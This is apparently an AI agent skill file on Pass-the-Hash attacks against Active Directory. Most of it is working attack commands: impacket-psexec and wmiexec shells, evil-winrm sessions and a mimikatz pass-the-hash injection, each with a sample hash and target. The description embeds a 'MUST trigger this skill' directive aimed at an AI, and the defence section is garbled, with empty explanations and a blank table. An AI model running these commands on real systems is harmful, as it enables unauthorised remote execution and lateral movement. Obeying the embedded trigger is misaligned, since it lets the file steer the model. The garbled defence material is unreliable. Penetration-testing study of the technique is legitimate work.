---
name: ad-pass-the-hash
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Exploit Active Directory environments using Pass-the-Hash (PtH). This skill details how to 
  authenticate to remote systems using the NTLM hash of a user's password instead of the 
  plaintext password, enabling lateral movement and privilege escalation without cracking hashes.
domain: cybersecurity
subdomain: penetration-testing
category: Active Directory
difficulty: intermediate
estimated_time: "1 hours"
mitre_attack:
  tactics: [TA0008]
  techniques: [T1550.002]
platforms: [windows, active-directory]
tags: [active-directory, pass-the-hash, pth, lateral-movement, credential-access, impacket, evil-winrm, psexec]
tools: [impacket-psexec, impacket-wmiexec, evil-winrm, mimikatz]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Pass-the-Hash (PtH)

## When to Use
- When you have successfully dumped credentials (e.g., from SAM, LSASS, or NTDS.dit) and acquired the NTLM hash of a target user, but the hash resists cracking efforts.
- To perform lateral movement to other machines where the compromised user has administrative access.

## Workflow

### Phase 1: Acquiring the NTLM Hash

Hashes are typically formatted as `LM_HASH:NTLM_HASH`.
Example: `aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29`
*(Note: Active Directory no longer stores the LM hash by default, so it's usually the blank `aad3...04ee` value, but the NTLM portion is what matters).*

### Phase 2: Execution via Impacket (Linux/Mac)

Impacket provides multiple tools that support the `-hashes` flag to interact with Windows protocols (SMB, WMI, RPC) via PtH.

```bash
# Concept: Gain an interactive SYSTEM shell over SMB impacket-psexec Administrator@192.168.1.50 -hashes aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29

# Gain a semi-interactive shell over WMI (stealthier) impacket-wmiexec target.local/Administrator@192.168.1.50 -hashes :88e4d9fabaecf3dec18dd80905521b29
```

### Phase 3: Execution via Evil-WinRM

If WinRM (Port 5985) is enabled on the target, Evil-WinRM provides a highly stable PowerShell session.

```bash
# evil-winrm -i 192.168.1.50 -u Administrator -H 88e4d9fabaecf3dec18dd80905521b29
```

### Phase 4: Execution via Mimikatz (Windows)

If you are operating directly from a compromised Windows machine, you can inject the hash into memory to spawn a process under the context of the target user.

```cmd
# mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:target.local /ntlm:88e4d9fabaecf3dec18dd80905521b29 /run:cmd.exe" "exit"
```
*A new command prompt will open running as the user, allowing access to network shares and execution across the domain.*

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Obtain NTLM Hash ] --> B{Target Service Open? ]}
    B -->|SMB (445)| C[Impacket PsExec/SMBExec ]
    B -->|WMI (135/...)| D[Impacket WMIexec ]
    B -->|WinRM (5985)| E[Evil-WinRM ]
    C & D & E --> F[Authenticated Remote Execution ]
```

## 🔵 Blue Team Detection & Defense
- **LAPS (Local Administrator Password Solution)**: **Disable NTLM Authentication**: **Windows Defender Credential Guard**: Key Concepts
| Concept | Description |
|---------|-------------|
| NTLM Authentication | |
| Memory Injection (Mimikatz) | |

## References
- Mitre ATT&CK: [Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- HackTricks: [Pass the Hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash)
